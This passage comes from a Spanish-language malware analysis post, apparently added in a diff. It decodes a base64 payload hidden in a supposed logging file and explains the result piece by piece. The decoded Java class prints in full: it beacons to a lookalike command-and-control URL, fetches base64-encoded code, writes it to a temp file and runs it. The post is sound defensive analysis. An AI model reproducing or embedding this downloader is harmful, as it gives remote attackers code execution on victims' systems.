+<span id="cb4-38"><a href="#cb4-38" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;CAgICAgICBidWZmZXIud3JpdGUob3JnX2ZpbGUpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBTdHJpbmcgY21kbGluZSA9ICJqYXZhICIgKyB&quot;</span></span>
+<span id="cb4-39"><a href="#cb4-39" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;vcmdfcGF0aCArICIgIiArIHVpZCArICIgIiArIFBPU1RfVVJMOwogICAgICAgICAgICAgICAgICAgIFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoY21kbGluZSk7CiAgICAgI&quot;</span></span>
+<span id="cb4-40"><a href="#cb4-40" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;CAgICAgICAgICAgICAgVGhyZWFkLnNsZWVwKDMwMDApOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgVGhyZWFkLnNsZWVwKDUwMDApOwogICAgICAgICAgICB&quot;</span></span>
+<span id="cb4-41"><a href="#cb4-41" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;9CiAgICAgICAgICAgIH0gY2F0Y2ggKEludGVycnVwdGVkRXhjZXB0aW9uIGV4KSB7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K&quot;</span><span class="op">;</span></span></code></pre></div>
+<p>Tal como fue comentado es contenido codificado en <code>base64</code>
+el cual será decodificado y posteriormente escrito en un archivo
+<code>.java</code> ubicado en un directorio temporal.</p>
+<p>Decodificando el contenido base64 de esta variable obtenemos el
+siguiente resultado, que dista mucho de ser un simple archivo de
+log:</p>
+<details>
+<summary>
+Código Java (112 líneas)
+</summary>
+<div class="sourceCode" id="cb5"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">io</span><span class="op">.</span><span class="im">IOException</span><span class="op">;</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">net</span><span class="op">.</span><span class="im">URI</span><span class="op">;</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">net</span><span class="op">.</span><span class="im">http</span><span class="op">.</span><span class="im">HttpClient</span><span class="op">;</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">net</span><span class="op">.</span><span class="im">http</span><span class="op">.</span><span class="im">HttpRequest</span><span class="op">;</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">net</span><span class="op">.</span><span class="im">http</span><span class="op">.</span><span class="im">HttpResponse</span><span class="op">;</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">nio</span><span class="op">.</span><span class="im">charset</span><span class="op">.</span><span class="im">StandardCharsets</span><span class="op">;</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">util</span><span class="op">.</span><span class="im">Base64</span><span class="op">;</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">util</span><span class="op">.</span><span class="im">Random</span><span class="op">;</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">io</span><span class="op">.</span><span class="im">BufferedWriter</span><span class="op">;</span></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">io</span><span class="op">.</span><span class="im">File</span><span class="op">;</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">io</span><span class="op">.</span><span class="im">FileWriter</span><span class="op">;</span></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">lang</span><span class="op">.</span><span class="im">Thread</span><span class="op">;</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> QRLog <span class="op">{</span></span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="dt">static</span> <span class="dt">final</span> <span class="bu">String</span> POST_URL <span class="op">=</span> <span class="st">&quot;https://www.git-hub.me/view.php&quot;</span><span class="op">;</span></span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="dt">static</span> <span class="dt">void</span> <span class="fu">main</span><span class="op">(</span><span class="bu">String</span><span class="op">[]</span> args<span class="op">)</span> <span class="kw">throws</span> <span class="bu">IOException</span><span class="op">{</span></span>
+<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a>        <span class="fu">sendPOST</span><span class="op">();</span></span>
+<span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-23"><a href="#cb5-23" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="dt">static</span> <span class="bu">String</span> <span class="fu">randGen</span><span class="op">()</span> <span class="kw">throws</span> <span class="bu">IOException</span> <span class="op">{</span></span>
+<span id="cb5-24"><a href="#cb5-24" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> strPool <span class="op">=</span> <span class="st">&quot;123456789&quot;</span><span class="op">;</span></span>
+<span id="cb5-25"><a href="#cb5-25" aria-hidden="true" tabindex="-1"></a>        <span class="bu">StringBuilder</span> sb <span class="op">=</span> <span class="kw">new</span> <span class="bu">StringBuilder</span><span class="op">();</span></span>
+<span id="cb5-26"><a href="#cb5-26" aria-hidden="true" tabindex="-1"></a>        <span class="bu">Random</span> rand <span class="op">=</span> <span class="kw">new</span> <span class="bu">Random</span><span class="op">();</span></span>
+<span id="cb5-27"><a href="#cb5-27" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb5-28"><a href="#cb5-28" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> <span class="op">(</span><span class="dt">int</span> i<span class="op">=</span><span class="dv">0</span><span class="op">;</span> i<span class="op">&lt;</span><span class="dv">8</span><span class="op">;</span> i<span class="op">++){</span></span>
+<span id="cb5-29"><a href="#cb5-29" aria-hidden="true" tabindex="-1"></a>            sb<span class="op">.</span><span class="fu">append</span><span class="op">(</span>strPool<span class="op">.</span><span class="fu">charAt</span><span class="op">(</span>rand<span class="op">.</span><span class="fu">nextInt</span><span class="op">(</span>strPool<span class="op">.</span><span class="fu">length</span><span class="op">())));</span></span>
+<span id="cb5-30"><a href="#cb5-30" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb5-31"><a href="#cb5-31" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb5-32"><a href="#cb5-32" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> sb<span class="op">.</span><span class="fu">toString</span><span class="op">();</span></span>
+<span id="cb5-33"><a href="#cb5-33" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb5-34"><a href="#cb5-34" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb5-35"><a href="#cb5-35" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="dt">static</span> <span class="bu">String</span> <span class="fu">getOperatingSystem</span><span class="op">()</span> <span class="op">{</span></span>
+<span id="cb5-36"><a href="#cb5-36" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> os <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;os.name&quot;</span><span class="op">);</span></span>
+<span id="cb5-37"><a href="#cb5-37" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> result <span class="op">=</span> <span class="kw">null</span><span class="op">;</span></span>
+<span id="cb5-38"><a href="#cb5-38" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb5-39"><a href="#cb5-39" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>os<span class="op">.</span><span class="fu">contains</span><span class="op">(</span><span class="st">&quot;Windows&quot;</span><span class="op">))</span></span>
+<span id="cb5-40"><a href="#cb5-40" aria-hidden="true" tabindex="-1"></a>            result <span class="op">=</span> <span class="st">&quot;0&quot;</span><span class="op">;</span></span>
+<span id="cb5-41"><a href="#cb5-41" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>os<span class="op">.</span><span class="fu">contains</span><span class="op">(</span><span class="st">&quot;Linux&quot;</span><span class="op">))</span></span>
+<span id="cb5-42"><a href="#cb5-42" aria-hidden="true" tabindex="-1"></a>            result <span class="op">=</span> <span class="st">&quot;2&quot;</span><span class="op">;</span></span>
+<span id="cb5-43"><a href="#cb5-43" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>os<span class="op">.</span><span class="fu">contains</span><span class="op">(</span><span class="st">&quot;Mac OS X&quot;</span><span class="op">))</span></span>
+<span id="cb5-44"><a href="#cb5-44" aria-hidden="true" tabindex="-1"></a>            result <span class="op">=</span> <span class="st">&quot;1&quot;</span><span class="op">;</span></span>
+<span id="cb5-45"><a href="#cb5-45" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> result<span class="op">;</span></span>
+<span id="cb5-46"><a href="#cb5-46" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb5-47"><a href="#cb5-47" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb5-48"><a href="#cb5-48" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="dt">static</span> <span class="dt">void</span> <span class="fu">sendPOST</span><span class="op">()</span> <span class="kw">throws</span> <span class="bu">IOException</span> <span class="op">{</span></span>
+<span id="cb5-49"><a href="#cb5-49" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> uid <span class="op">=</span> <span class="fu">randGen</span><span class="op">();</span></span>
+<span id="cb5-50"><a href="#cb5-50" aria-hidden="true" tabindex="-1"></a>        <span class="bu">StringBuilder</span> data <span class="op">=</span> <span class="kw">new</span> <span class="bu">StringBuilder</span><span class="op">();</span></span>
+<span id="cb5-51"><a href="#cb5-51" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> sec_path <span class="op">=</span> <span class="st">&quot;&quot;</span><span class="op">;</span></span>
+<span id="cb5-52"><a href="#cb5-52" aria-hidden="true" tabindex="-1"></a>        data<span class="op">.</span><span class="fu">append</span><span class="op">(</span><span class="st">&quot;GITHUB_REQ&quot;</span><span class="op">);</span></span>
+<span id="cb5-53"><a href="#cb5-53" aria-hidden="true" tabindex="-1"></a>        data<span class="op">.</span><span class="fu">append</span><span class="op">(</span>uid<span class="op">);</span></span>
+<span id="cb5-54"><a href="#cb5-54" aria-hidden="true" tabindex="-1"></a>        data<span class="op">.</span><span class="fu">append</span><span class="op">(</span><span class="st">&quot;2000&quot;</span><span class="op">);</span></span>
+<span id="cb5-55"><a href="#cb5-55" aria-hidden="true" tabindex="-1"></a>        data<span class="op">.</span><span class="fu">append</span><span class="op">(</span><span class="fu">getOperatingSystem</span><span class="op">());</span></span>
+<span id="cb5-56"><a href="#cb5-56" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb5-57"><a href="#cb5-57" aria-hidden="true" tabindex="-1"></a>        <span class="cf">while</span> <span class="op">(</span><span class="kw">true</span><span class="op">)</span></span>
+<span id="cb5-58"><a href="#cb5-58" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
+<span id="cb5-59"><a href="#cb5-59" aria-hidden="true" tabindex="-1"></a>            <span class="cf">try</span> <span class="op">{</span></span>
+<span id="cb5-60"><a href="#cb5-60" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> <span class="op">(</span>sec_path<span class="op">.</span><span class="fu">length</span><span class="op">()</span> <span class="op">&gt;</span> <span class="dv">1</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb5-61"><a href="#cb5-61" aria-hidden="true" tabindex="-1"></a>                    <span class="bu">File</span> secFile <span class="op">=</span> <span class="kw">new</span> <span class="bu">File</span><span class="op">(</span>sec_path<span class="op">);</span></span>
+<span id="cb5-62"><a href="#cb5-62" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">if</span> <span class="op">(</span>secFile<span class="op">.</span><span class="fu">exists</span><span class="op">())</span></span>
+<span id="cb5-63"><a href="#cb5-63" aria-hidden="true" tabindex="-1"></a>                        <span class="bu">System</span><span class="op">.</span><span class="fu">exit</span><span class="op">(</span><span class="dv">0</span><span class="op">);</span></span>
+<span id="cb5-64"><a href="#cb5-64" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span></span>
+<span id="cb5-65"><a href="#cb5-65" aria-hidden="true" tabindex="-1"></a>                </span>
+<span id="cb5-66"><a href="#cb5-66" aria-hidden="true" tabindex="-1"></a>                HttpRequest request <span class="op">=</span> HttpRequest<span class="op">.</span><span class="fu">newBuilder</span><span class="op">()</span></span>
+<span id="cb5-67"><a href="#cb5-67" aria-hidden="true" tabindex="-1"></a>                    <span class="op">.</span><span class="fu">header</span><span class="op">(</span><span class="st">&quot;Content-Type&quot;</span><span class="op">,</span> <span class="st">&quot;application/json; charset=utf-8&quot;</span><span class="op">)</span></span>
+<span id="cb5-68"><a href="#cb5-68" aria-hidden="true" tabindex="-1"></a>                    <span class="op">.</span><span class="fu">version</span><span class="op">(</span>HttpClient<span class="op">.</span><span class="fu">Version</span><span class="op">.</span><span class="fu">HTTP_1_1</span><span class="op">)</span></span>
+<span id="cb5-69"><a href="#cb5-69" aria-hidden="true" tabindex="-1"></a>                    <span class="op">.</span><span class="fu">uri</span><span class="op">(</span><span class="bu">URI</span><span class="op">.</span><span class="fu">create</span><span class="op">(</span>POST_URL<span class="op">))</span></span>
+<span id="cb5-70"><a href="#cb5-70" aria-hidden="true" tabindex="-1"></a>                    <span class="op">.</span><span class="fu">POST</span><span class="op">(</span>HttpRequest<span class="op">.</span><span class="fu">BodyPublishers</span><span class="op">.</span><span class="fu">ofString</span><span class="op">(</span>data<span class="op">.</span><span class="fu">toString</span><span class="op">()))</span></span>
+<span id="cb5-71"><a href="#cb5-71" aria-hidden="true" tabindex="-1"></a>                    <span class="op">.</span><span class="fu">build</span><span class="op">();</span></span>
+<span id="cb5-72"><a href="#cb5-72" aria-hidden="true" tabindex="-1"></a>                HttpClient client <span class="op">=</span> HttpClient<span class="op">.</span><span class="fu">newHttpClient</span><span class="op">();</span></span>
+<span id="cb5-73"><a href="#cb5-73" aria-hidden="true" tabindex="-1"></a>                HttpResponse<span class="op">&lt;</span><span class="bu">String</span><span class="op">&gt;</span> response <span class="op">=</span> client<span class="op">.</span><span class="fu">send</span><span class="op">(</span>request<span class="op">,</span> HttpResponse<span class="op">.</span><span class="fu">BodyHandlers</span><span class="op">.</span><span class="fu">ofString</span><span class="op">());</span></span>
+<span id="cb5-74"><a href="#cb5-74" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> <span class="op">(</span>response<span class="op">.</span><span class="fu">statusCode</span><span class="op">()</span> <span class="op">!=</span> <span class="dv">200</span><span class="op">)</span></span>
+<span id="cb5-75"><a href="#cb5-75" aria-hidden="true" tabindex="-1"></a>                <span class="op">{</span></span>
+<span id="cb5-76"><a href="#cb5-76" aria-hidden="true" tabindex="-1"></a>                    <span class="bu">Thread</span><span class="op">.</span><span class="fu">sleep</span><span class="op">(</span><span class="dv">5000</span><span class="op">);</span></span>
+<span id="cb5-77"><a href="#cb5-77" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">continue</span><span class="op">;</span></span>
+<span id="cb5-78"><a href="#cb5-78" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span></span>
+<span id="cb5-79"><a href="#cb5-79" aria-hidden="true" tabindex="-1"></a>                <span class="bu">String</span> resStr <span class="op">=</span> response<span class="op">.</span><span class="fu">body</span><span class="op">();</span></span>
+<span id="cb5-80"><a href="#cb5-80" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> <span class="op">(!</span>resStr<span class="op">.</span><span class="fu">startsWith</span><span class="op">(</span><span class="st">&quot;GITHUB_RES&quot;</span><span class="op">))</span></span>
+<span id="cb5-81"><a href="#cb5-81" aria-hidden="true" tabindex="-1"></a>                <span class="op">{</span></span>
+<span id="cb5-82"><a href="#cb5-82" aria-hidden="true" tabindex="-1"></a>                    <span class="bu">System</span><span class="op">.</span><span class="fu">out</span><span class="op">.</span><span class="fu">println</span><span class="op">(</span><span class="st">&quot;Data Error&quot;</span><span class="op">);</span></span>
+<span id="cb5-83"><a href="#cb5-83" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb5-84"><a href="#cb5-84" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> <span class="op">(</span>resStr<span class="op">.</span><span class="fu">length</span><span class="op">()</span> <span class="op">&gt;</span> <span class="dv">11</span><span class="op">)</span></span>
+<span id="cb5-85"><a href="#cb5-85" aria-hidden="true" tabindex="-1"></a>                <span class="op">{</span></span>
+<span id="cb5-86"><a href="#cb5-86" aria-hidden="true" tabindex="-1"></a>                    <span class="bu">String</span> enc_data <span class="op">=</span> resStr<span class="op">.</span><span class="fu">substring</span><span class="op">(</span><span class="dv">10</span><span class="op">);</span></span>
+<span id="cb5-87"><a href="#cb5-87" aria-hidden="true" tabindex="-1"></a>                    <span class="dt">byte</span> <span class="op">[]</span> dec_data <span class="op">=</span> Base64<span class="op">.</span><span class="fu">getDecoder</span><span class="op">().</span><span class="fu">decode</span><span class="op">(</span>enc_data<span class="op">);</span></span>
+<span id="cb5-88"><a href="#cb5-88" aria-hidden="true" tabindex="-1"></a>                    <span class="bu">String</span> org_file <span class="op">=</span> <span class="kw">new</span> <span class="bu">String</span><span class="op">(</span>dec_data<span class="op">,</span> StandardCharsets<span class="op">.</span><span class="fu">UTF_8</span><span class="op">);</span></span>
+<span id="cb5-89"><a href="#cb5-89" aria-hidden="true" tabindex="-1"></a>                    <span class="bu">String</span> org_path<span class="op">;</span></span>
+<span id="cb5-90"><a href="#cb5-90" aria-hidden="true" tabindex="-1"></a>                    </span>
+<span id="cb5-91"><a href="#cb5-91" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">if</span> <span class="op">(</span><span class="bu">Integer</span><span class="op">.</span><span class="fu">parseInt</span><span class="op">(</span><span class="fu">getOperatingSystem</span><span class="op">())</span> <span class="op">==</span> <span class="dv">0</span><span class="op">)</span></span>
+<span id="cb5-92"><a href="#cb5-92" aria-hidden="true" tabindex="-1"></a>                    <span class="op">{</span></span>
+<span id="cb5-93"><a href="#cb5-93" aria-hidden="true" tabindex="-1"></a>                        org_path <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="op">)</span> <span class="op">+</span> <span class="st">&quot;</span><span class="sc">\\</span><span class="st">prefTmp.java&quot;</span><span class="op">;</span></span>
+<span id="cb5-94"><a href="#cb5-94" aria-hidden="true" tabindex="-1"></a>                        sec_path <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="op">)</span> <span class="op">+</span> <span class="st">&quot;</span><span class="sc">\\</span><span class="st">p.dat&quot;</span><span class="op">;</span></span>
+<span id="cb5-95"><a href="#cb5-95" aria-hidden="true" tabindex="-1"></a>                    <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb5-96"><a href="#cb5-96" aria-hidden="true" tabindex="-1"></a>                        org_path <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="op">)</span> <span class="op">+</span> <span class="st">&quot;/prefTmp.java&quot;</span><span class="op">;</span></span>
+<span id="cb5-97"><a href="#cb5-97" aria-hidden="true" tabindex="-1"></a>                        sec_path <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="op">)</span> <span class="op">+</span> <span class="st">&quot;/p.dat&quot;</span><span class="op">;</span></span>
+<span id="cb5-98"><a href="#cb5-98" aria-hidden="true" tabindex="-1"></a>                    <span class="op">}</span></span>
+<span id="cb5-99"><a href="#cb5-99" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">try</span> <span class="op">(</span><span class="bu">FileWriter</span> file <span class="op">=</span> <span class="kw">new</span> <span class="bu">FileWriter</span><span class="op">(</span>org_path<span class="op">,</span> <span class="kw">true</span><span class="op">);</span><span class="bu">BufferedWriter</span> buffer <span class="op">=</span> <span class="kw">new</span> <span class="bu">BufferedWriter</span><span class="op">(</span>file<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb5-100"><a href="#cb5-100" aria-hidden="true" tabindex="-1"></a>                        buffer<span class="op">.</span><span class="fu">write</span><span class="op">(</span>org_file<span class="op">);</span></span>
+<span id="cb5-101"><a href="#cb5-101" aria-hidden="true" tabindex="-1"></a>                    <span class="op">}</span></span>
+<span id="cb5-102"><a href="#cb5-102" aria-hidden="true" tabindex="-1"></a>                    <span class="bu">String</span> cmdline <span class="op">=</span> <span class="st">&quot;java &quot;</span> <span class="op">+</span> org_path <span class="op">+</span> <span class="st">&quot; &quot;</span> <span class="op">+</span> uid <span class="op">+</span> <span class="st">&quot; &quot;</span> <span class="op">+</span> POST_URL<span class="op">;</span></span>
+<span id="cb5-103"><a href="#cb5-103" aria-hidden="true" tabindex="-1"></a>                    <span class="bu">Runtime</span><span class="op">.</span><span class="fu">getRuntime</span><span class="op">().</span><span class="fu">exec</span><span class="op">(</span>cmdline<span class="op">);</span></span>
+<span id="cb5-104"><a href="#cb5-104" aria-hidden="true" tabindex="-1"></a>                    <span class="bu">Thread</span><span class="op">.</span><span class="fu">sleep</span><span class="op">(</span><span class="dv">3000</span><span class="op">);</span></span>
+<span id="cb5-105"><a href="#cb5-105" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span></span>
+<span id="cb5-106"><a href="#cb5-106" aria-hidden="true" tabindex="-1"></a>                <span class="bu">Thread</span><span class="op">.</span><span class="fu">sleep</span><span class="op">(</span><span class="dv">5000</span><span class="op">);</span></span>
+<span id="cb5-107"><a href="#cb5-107" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb5-108"><a href="#cb5-108" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span> <span class="cf">catch</span> <span class="op">(</span><span class="bu">InterruptedException</span> ex<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb5-109"><a href="#cb5-109" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb5-110"><a href="#cb5-110" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb5-111"><a href="#cb5-111" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb5-112"><a href="#cb5-112" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+</details>
+<p>¿Qué acciones realiza este código?</p>
+<ul>
+<li>Importa distintas librerías que le permiten realizar llamadas HTTP,
+realizar operaciones sobre contenido codificado en base64, manipular
+archivos, generar números aleatorios y usar hilos (threads).</li>
+</ul>
+<div class="sourceCode" id="cb6"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">io</span><span class="op">.</span><span class="im">IOException</span><span class="op">;</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">net</span><span class="op">.</span><span class="im">URI</span><span class="op">;</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">net</span><span class="op">.</span><span class="im">http</span><span class="op">.</span><span class="im">HttpClient</span><span class="op">;</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">net</span><span class="op">.</span><span class="im">http</span><span class="op">.</span><span class="im">HttpRequest</span><span class="op">;</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">net</span><span class="op">.</span><span class="im">http</span><span class="op">.</span><span class="im">HttpResponse</span><span class="op">;</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">nio</span><span class="op">.</span><span class="im">charset</span><span class="op">.</span><span class="im">StandardCharsets</span><span class="op">;</span></span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">util</span><span class="op">.</span><span class="im">Base64</span><span class="op">;</span></span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">util</span><span class="op">.</span><span class="im">Random</span><span class="op">;</span></span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">io</span><span class="op">.</span><span class="im">BufferedWriter</span><span class="op">;</span></span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">io</span><span class="op">.</span><span class="im">File</span><span class="op">;</span></span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">io</span><span class="op">.</span><span class="im">FileWriter</span><span class="op">;</span></span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">lang</span><span class="op">.</span><span class="im">Thread</span><span class="op">;</span></span></code></pre></div>
+<ul>
+<li>Declara una variable String donde almacena una URL maliciosa,
+seguramente su servidor de Comando y Control (C2).</li>
+</ul>
+<div class="sourceCode" id="cb7"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="kw">private</span> <span class="dt">static</span> <span class="dt">final</span> <span class="bu">String</span> POST_URL <span class="op">=</span> <span class="st">&quot;https://www.git-hub.me/view.php&quot;</span><span class="op">;</span></span></code></pre></div>
+<ul>
+<li>Declara una String compuesta por ocho números aleatorios, utilizado
+posteriormente para crear directorios temporales con nombres
+únicos.</li>
+</ul>
+<div class="sourceCode" id="cb8"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="kw">private</span> <span class="dt">static</span> <span class="bu">String</span> <span class="fu">randGen</span><span class="op">()</span> <span class="kw">throws</span> <span class="bu">IOException</span> <span class="op">{</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>  <span class="bu">String</span> strPool <span class="op">=</span> <span class="st">&quot;123456789&quot;</span><span class="op">;</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>  <span class="bu">StringBuilder</span> sb <span class="op">=</span> <span class="kw">new</span> <span class="bu">StringBuilder</span><span class="op">();</span></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>  <span class="bu">Random</span> rand <span class="op">=</span> <span class="kw">new</span> <span class="bu">Random</span><span class="op">();</span></span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>  <span class="cf">for</span> <span class="op">(</span><span class="dt">int</span> i<span class="op">=</span><span class="dv">0</span><span class="op">;</span> i<span class="op">&lt;</span><span class="dv">8</span><span class="op">;</span> i<span class="op">++){</span></span>
